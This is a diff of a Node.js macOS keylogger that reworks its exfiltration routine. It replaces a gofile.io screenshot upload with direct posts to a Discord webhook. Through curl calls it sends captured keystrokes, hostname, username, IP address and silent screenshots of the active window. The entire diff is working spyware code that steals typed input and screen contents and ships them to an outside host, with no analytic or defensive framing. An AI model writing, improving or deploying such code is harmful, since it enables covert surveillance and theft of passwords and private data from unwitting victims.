@@ -765,36 +765,42 @@ connectToServer();
 // REMOVED: takeScreenshot function - not needed for simple keylogger
 // Screenshots can be added later if needed, but for now we only send keystrokes
 
-// Upload screenshot to gofile.io and get URL
-function uploadScreenshot(filepath, callback) {
+// Upload screenshot directly to Discord as file attachment (not gofile)
+function uploadScreenshotToDiscord(filepath, message, callback) {
     if (!fs.existsSync(filepath)) {
         callback(null);
         return;
     }
     
-    // Upload to gofile.io (using the same API as troubleshoot.sh)
-    exec(`curl -s -F "file=@${filepath}" "${UPLOAD_SERVICE}"`, (error, stdout) => {
-        if (error || !stdout) {
-            callback(null);
-            return;
-        }
+    // Discord webhook supports file uploads via multipart/form-data
+    // Create a temporary JSON payload file
+    const payloadFile = path.join(screenshotDir, `discord_payload_${Date.now()}.json`);
+    const payload = {
+        content: message
+    };
+    
+    try {
+        fs.writeFileSync(payloadFile, JSON.stringify(payload));
         
-        try {
-            const response = JSON.parse(stdout);
-            if (response.status === 'ok' && response.data && response.data.downloadPage) {
-                callback(response.data.downloadPage);
-            } else if (response.data && response.data.downloadPage) {
-                callback(response.data.downloadPage);
-            } else {
+        // Upload screenshot + message to Discord using multipart/form-data
+        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath}" "${WEBHOOK}"`, (error, stdout) => {
+            // Clean up payload file
+            setTimeout(() => {
+                try { fs.unlinkSync(payloadFile); } catch (e) {}
+            }, 5000);
+            
+            if (error) {
                 callback(null);
+            } else {
+                callback('uploaded');
             }
-        } catch (e) {
-            callback(null);
-        }
-    });
+        });
+    } catch (e) {
+        callback(null);
+    }
 }
 
-// Send keylog to Discord with screenshot
+// Send keylog to Discord with screenshot (screenshot sent directly as file, not gofile)
 function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
@@ -810,37 +816,18 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // If we have a screenshot, upload it first
+    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+    
+    // If we have a screenshot, upload it directly to Discord as file attachment
     if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
-        uploadScreenshot(screenshotFilePath, (screenshotUrl) => {
-            let keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
-            
-            if (screenshotUrl) {
-                keylogContent += `\n📸 **Screenshot:** ${screenshotUrl}`;
-            }
-            
-            const payload = {
-                content: keylogContent
-            };
-            
-            const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
-            try {
-                fs.writeFileSync(payloadFile, JSON.stringify(payload));
-                exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
-                    setTimeout(() => {
-                        try { fs.unlinkSync(payloadFile); } catch (e) {}
-                    }, 5000);
-                });
-            } catch (e) {
-                // Fallback
-                const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}${screenshotUrl ? '\nScreenshot: ' + screenshotUrl : ''}`;
-                exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
-            }
+        uploadScreenshotToDiscord(screenshotFilePath, keylogContent, (result) => {
+            // Screenshot uploaded, clean up after delay
+            setTimeout(() => {
+                try { fs.unlinkSync(screenshotFilePath); } catch (e) {}
+            }, 10000);
         });
     } else {
         // No screenshot - just send text
-        const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
-        
         const payload = {
             content: keylogContent
         };
@@ -887,18 +874,17 @@ setInterval(() => {
                 const timestamp = Date.now();
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                // Get active window ID and capture it (shows the app/window, not desktop)
-                exec(`osascript -e 'tell application "System Events" to get id of first window of first process whose frontmost is true' 2>/dev/null`, (windowError, windowId) => {
-                    let captureCmd;
-                    if (!windowError && windowId && windowId.trim()) {
-                        // Capture specific active window
-                        captureCmd = `screencapture -x -l${windowId.trim()} "${screenshotFile}"`;
-                    } else {
-                        // Fallback: capture main display (but try to focus on active app)
-                        captureCmd = `screencapture -x -m "${screenshotFile}"`;
-                    }
-                    
-                    exec(captureCmd, (screenshotError) => {
+                // Get active window and capture it (shows the app/window, not desktop)
+                // Use a different approach - capture the window using AppleScript directly
+                exec(`osascript -e 'tell application "System Events" to tell (first process whose frontmost is true) to set windowBounds to bounds of window 1' 2>/dev/null`, (boundsError, bounds) => {
+                    if (!boundsError && bounds && bounds.trim()) {
+                        // Parse bounds and capture that region
+                        const boundsArray = bounds.trim().split(', ').map(Number);
+                        if (boundsArray.length === 4) {
+                            const width = boundsArray[2] - boundsArray[0];
+                            const height = boundsArray[3] - boundsArray[1];
+                            // Capture the window region
+                            exec(`screencapture -x -R ${boundsArray[0]},${boundsArray[1]},${width},${height} "${screenshotFile}"`, (screenshotError) => {
                         if (!screenshotError && fs.existsSync(screenshotFile)) {
                             // Send with screenshot
                             sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
@@ -943,28 +929,44 @@ setInterval(() => {
                     const timestamp = Date.now();
                     const screenshotFile = path.join(screenshotDir, `typing_${timestamp}.png`);
                     
-                    // Get active window ID and capture it (shows the app/window, not desktop)
-                    exec(`osascript -e 'tell application "System Events" to get id of first window of first process whose frontmost is true' 2>/dev/null`, (windowError, windowId) => {
-                        let captureCmd;
-                        if (!windowError && windowId && windowId.trim()) {
-                            // Capture specific active window
-                            captureCmd = `screencapture -x -l${windowId.trim()} "${screenshotFile}"`;
-                        } else {
-                            // Fallback: capture main display
-                            captureCmd = `screencapture -x -m "${screenshotFile}"`;
-                        }
-                        
-                        exec(captureCmd, (screenshotError) => {
-                            if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
-                                setTimeout(() => {
-                                    try { fs.unlinkSync(screenshotFile); } catch (e) {}
-                                }, 30000);
+                    // Get active window bounds and capture it (shows the app/window, not desktop)
+                    exec(`osascript -e 'tell application "System Events" to tell (first process whose frontmost is true) to set windowBounds to bounds of window 1' 2>/dev/null`, (boundsError, bounds) => {
+                        if (!boundsError && bounds && bounds.trim()) {
+                            const boundsArray = bounds.trim().split(', ').map(Number);
+                            if (boundsArray.length === 4) {
+                                const width = boundsArray[2] - boundsArray[0];
+                                const height = boundsArray[3] - boundsArray[1];
+                                // Capture the window region
+                                exec(`screencapture -x -R ${boundsArray[0]},${boundsArray[1]},${width},${height} "${screenshotFile}"`, (screenshotError) => {
+                                    if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
+                                    } else {
+                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                                    }
+                                    keysBuffer = '';
+                                });
                             } else {
-                                sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                                // Fallback
+                                exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                                    if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
+                                    } else {
+                                        sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                                    }
+                                    keysBuffer = '';
+                                });
                             }
-                            keysBuffer = '';
-                        });
+                        } else {
+                            // Fallback
+                            exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                                if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                    sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
+                                } else {
+                                    sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                                }
+                                keysBuffer = '';
+                            });
+                        }
                     });
                 }
             }
